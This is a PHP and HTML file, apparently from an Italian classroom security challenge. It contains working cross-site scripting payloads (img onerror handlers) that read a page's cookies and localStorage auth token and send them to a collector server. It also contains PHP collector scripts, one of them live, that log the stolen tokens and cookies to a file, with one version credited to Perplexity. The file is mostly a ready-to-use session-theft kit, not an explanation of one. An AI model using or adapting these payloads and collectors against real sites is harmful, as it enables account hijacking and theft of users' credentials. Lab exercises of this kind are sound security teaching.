<!-- Server a cui inviare i cookie rubati: Challenge 5 parte 2 

avviare con 

php -S 0.0.0.0:9000

 

-->
 <!-- <?php

// file_put_contents(
//     __DIR__ . '/stolen.txt',
//     date('c') . ' | ' . ($_SERVER['QUERY_STRING'] ?? 'no data') . PHP_EOL,
//     FILE_APPEND
// );

// echo 'Cookie rubati ';

?> -->


<!-- 
Codice malevolo payload

<img src=x onerror="new Image().src='http://localhost:9000/steal.php?c='+document.cookie">
 -->



 <!-- CODICE DEL PROFESSORE  -->

 <!-- per avviare il server: php -S localhost:8000 -->



 <!-- CODICE MALEVOLO

 <img src="x" onerror="const authToken = localStorage.getItem('authToken');const url = `http://localhost:8000/saveToken.php?authToken=${encodeURIComponent(authToken)}`;fetch(url).then(response => {if (response.ok) {console.log('Token inviato con successo!');} else {console.error('Errore durante l\'invio del token');}}).catch(error => console.error('Errore di rete:', error));">
  
 
 
 -->

 <?php
// Nome del file in cui salvare il token
// $file = 'authTokens.txt';

// Controlla se il parametro authToken è presente  nella richiesta GET
// if (isset($_GET['authToken'])) {
//     $authToken = $_GET['authToken'];

    // Aggiungi il token al file (in modalità append)
//     $success = file_put_contents($file, $authToken . PHP_EOL, FILE_APPEND);

//     if ($success) {
//         echo 'Token salvato con successo!';
//     } else {
//         http_response_code(500);
//         echo 'Errore durante il salvataggio del token.';
//     }
// } else {
//     http_response_code(400);
//     echo 'Token non fornito.';
// }
?>




<!-- CODICE DA PERPLEXITY -->

<?php
$file = 'stolen_data.txt';
if (isset($_GET['authToken']) || isset($_GET['cookies'])) {
    $data = date('Y-m-d H:i:s') . ' - ';
    $data .= 'Token: ' . ($_GET['authToken'] ?? 'N/A') . ' | ';
    $data .= 'Cookies: ' . ($_GET['cookies'] ?? 'N/A') . PHP_EOL;
    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
    http_response_code(200);
    echo 'Dati salvati!';
} else {
    http_response_code(400);
    echo 'No data';
}
?>

<!-- payload aggiornato DA PERPLEXITY -->

<!-- <img src="x" onerror="const token=localStorage.getItem('authToken');const cookies=document.cookie;fetch('http://localhost:8000/saveToken.php?authToken='+encodeURIComponent(token)+'&cookies='+encodeURIComponent(cookies));"> -->